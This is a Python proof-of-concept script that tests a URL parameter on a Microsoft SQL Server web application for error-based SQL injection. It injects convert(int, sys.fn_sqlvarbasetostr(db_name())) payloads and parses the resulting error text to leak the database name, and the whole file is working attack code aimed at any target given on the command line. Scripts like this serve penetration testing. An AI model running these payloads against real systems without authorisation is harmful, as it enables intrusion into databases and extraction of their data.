#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

payload_list = ["convert(int,sys.fn_sqlvarbasetostr({}))","'and/**/convert(int,sys.fn_sqlvarbasetostr({}))>'0"]

select_list = ["db_name()"]


def verify(vulnurl):
    headers = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
                'Upgrade-Insecure-Requests':'1',
                'Connection':'keep-alive',
                'Cache-Control':'max-age=0',
                'Accept-Encoding':'gzip, deflate, sdch',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Referer': vulnurl
    }
    try:
        r = requests.get(vulnurl, headers=headers, verify=False, timeout=10)
        #print(r.text)
        if "nvarchar" in r.text:
            info = re.findall("nvarchar(.*)int", r.text)
            if len(info) != 0 and "fn_sqlvarbasetostr" not in info[0]:
                return info[0]
    except:
        #print(sys.exc_info())
        return "except"
    return "nosql"

def check(vulnurl, parm):
    info = verify(vulnurl)
    if info == "except":
        return False, ""
    for select in select_list:
        for payload in payload_list:
            select_payload = payload.format(select)
            parm_list = []
            for p in vulnurl.split("?")[1].split("&"):
                if p.split("=")[0] == parm:
                    parm_list.append(parm+"="+select_payload)
                else:
                    parm_list.append(p)
            new_vulurl = vulnurl.split("?")[0] + "?" + "&".join(parm_list)
            info = verify(new_vulurl)
            if info != "except" and info != "nosql":
                return info, select_payload
    return False, ""

if __name__=="__main__":
    target = sys.argv[1]
    parm = sys.argv[2]
    info, payload = check(target, parm)
    if info != False:
        print("[+]漏洞存在，SQL 检测 paylaod: ", payload,"查询结果为：", info)
    else:
        print("[-]漏洞不存在")
